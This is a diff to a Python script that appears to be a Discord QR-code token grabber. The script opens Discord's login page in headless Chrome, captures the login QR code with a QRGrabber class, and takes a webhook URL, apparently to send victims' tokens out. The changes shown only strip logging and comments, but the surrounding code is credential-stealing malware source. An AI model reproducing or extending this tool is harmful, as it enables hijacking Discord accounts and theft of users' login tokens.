@@ -20,7 +20,6 @@ import os
 import time
 import win32clipboard
 from io import BytesIO
-from logging import ERROR
 from tempfile import NamedTemporaryFile, TemporaryDirectory
 from threading import Thread, Event
 from bs4 import BeautifulSoup
@@ -30,24 +29,20 @@ from pystyle import Box, Center, Colorate, Colors, System, Write
 from selenium import webdriver
 from selenium.common.exceptions import WebDriverException
 from selenium.webdriver.chrome.service import Service
-from constants import BANNER, PYSTRAY_IMG, SLEEP_TIME
+from constants import BANNER, PYSTRAY_IMG
 from discord_token import QRGrabber, TokenInfo
 from exceptions import InvalidToken, QRCodeNotFound, WebhookSendFailure
 from queue import Queue
 from signal import SIGTERM
-from logger import log_unknown_exceptions
 
 
-@log_unknown_exceptions(ERROR)
 def main(webhook_url: str) -> None:
-    #The main function of the program.
     Write.Print('\n\n[!] Generating QR code...', Colors.red_to_purple)
     opts = webdriver.ChromeOptions()
     opts.add_argument('--headless')
     opts.add_experimental_option('detach', True)
     opts.add_experimental_option('excludeSwitches', ['enable-logging'])
     opts.add_argument('--log-level 3')
-    # This module have conflicts with PyStyle; importing here prevents the issue.
     from webdriver_manager.chrome import ChromeDriverManager
     os.environ['WDM_PROGRESS_BAR'] = str(0)
     os.environ['WDM_LOG_LEVEL'] = '0'
@@ -60,7 +55,6 @@ def main(webhook_url: str) -> None:
             'WebDriverException : have you tried installing the latest version of Google Chrome?')
     main.driver.implicitly_wait(5)
     main.driver.get('https://discord.com/login')
-    # Attempted to do this with WebDriverWait but it resulted in a fail.
     time.sleep(5)
     source = BeautifulSoup(main.driver.page_source, features='html.parser')
     qrg = QRGrabber('resources')
@@ -153,7 +147,6 @@ def main(webhook_url: str) -> None:
 
 
 if __name__ == "__main__":
-    @log_unknown_exceptions(ERROR)
     def pystray_icon():
         def window_state(_, item):
             if str(item) == 'Show':
@@ -204,5 +197,5 @@ if __name__ == "__main__":
     Thread(target=pystray_icon).start()
     th_main.start()
     while th_main.is_alive():
-        time.sleep(SLEEP_TIME)
+        time.sleep(1)
     pystray_icon.icon.stop()
